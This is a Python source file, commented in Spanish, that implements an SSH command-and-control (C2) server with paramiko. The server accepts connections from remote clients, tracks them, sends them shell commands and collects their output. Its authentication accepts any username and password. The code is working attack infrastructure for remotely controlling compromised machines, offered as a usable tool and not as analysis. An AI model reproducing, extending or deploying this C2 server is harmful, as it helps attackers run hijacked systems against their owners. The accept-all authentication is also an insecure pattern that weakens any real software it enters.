import socket
import threading
import paramiko
import os

class ConnectedClient:
    """
    Representa un cliente conectado al servidor C2.
    """
    def __init__(self, addr, transport, channel, username="unknown"):
        self.addr = addr
        self.transport = transport
        self.channel = channel
        self.username = username
        self.active = True

    def send_command(self, cmd, timeout=10):
        """
        Envía un comando al cliente y espera la respuesta.
        """
        try:
            self.channel.send(cmd + '\n')
            output = ""
            self.channel.settimeout(timeout)
            while True:
                if self.channel.recv_ready():
                    data = self.channel.recv(4096).decode()
                    output += data
                    if output.endswith('\n__END__\n'):
                        output = output.replace('\n__END__\n', '')
                        break
                else:
                    if self.channel.closed or self.channel.exit_status_ready():
                        break
            return output.strip()
        except Exception as e:
            return f"Error enviando comando: {e}"

    def close(self):
        """
        Cierra la conexión con el cliente.
        """
        self.active = False
        try:
            self.channel.close()
        except Exception:
            pass
        try:
            self.transport.close()
        except Exception:
            pass

    def __str__(self):
        return f"{self.username}@{self.addr[0]}:{self.addr[1]} (activo: {self.active})"

class SSHServer:
    """
    Servidor SSH C2 usando paramiko.
    """
    def __init__(self, host, port, key_path):
        self.host = host
        self.port = port
        self.key_path = key_path
        self.server_key = self._load_or_generate_key()
        self._clients = []
        self.running = False
        self.lock = threading.Lock()

    def _load_or_generate_key(self):
        if not os.path.exists(self.key_path):
            key = paramiko.RSAKey.generate(2048)
            key.write_private_key_file(self.key_path)
        return paramiko.RSAKey(filename=self.key_path)

    def start(self):
        self.running = True
        self.server_thread = threading.Thread(target=self._run_server, daemon=True)
        self.server_thread.start()

    def stop(self):
        self.running = False
        with self.lock:
            for client in self._clients:
                client.close()
            self._clients.clear()

    def list_clients(self):
        """
        Devuelve una lista de clientes activos.
        """
        with self.lock:
            return [c for c in self._clients if c.active]

    def get_client_info(self):
        """
        Devuelve información resumida de los clientes conectados.
        """
        with self.lock:
            return [str(c) for c in self._clients if c.active]

    def send_command(self, client, cmd):
        """
        Envía un comando a un cliente y devuelve la respuesta.
        """
        return client.send_command(cmd)

    def disconnect_client(self, client):
        """
        Desconecta a un cliente específico.
        """
        with self.lock:
            if client in self._clients:
                client.close()
                self._clients.remove(client)

    def _run_server(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(100)
        while self.running:
            try:
                client_sock, addr = sock.accept()
                t = paramiko.Transport(client_sock)
                t.add_server_key(self.server_key)
                server = _ParamikoSSHServer()
                try:
                    t.start_server(server=server)
                except paramiko.SSHException:
                    continue
                chan = t.accept(20)
                if chan is None:
                    continue
                username = getattr(server, "last_username", "unknown")
                client = ConnectedClient(addr, t, chan, username=username)
                with self.lock:
                    self._clients.append(client)
                threading.Thread(target=self._handle_client, args=(client,), daemon=True).start()
            except Exception:
                continue

    def _handle_client(self, client):
        try:
            while self.running and not client.channel.closed:
                if client.channel.exit_status_ready():
                    break
        finally:
            client.close()
            with self.lock:
                if client in self._clients:
                    self._clients.remove(client)

class _ParamikoSSHServer(paramiko.ServerInterface):
    """
    Implementación básica de ServerInterface de paramiko.
    """
    def __init__(self):
        self.last_username = None

    def check_auth_password(self, username, password):
        self.last_username = username
        # Para pruebas, acepta cualquier usuario/contraseña
        return paramiko.AUTH_SUCCESSFUL

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_shell_request(self, channel):
        return True
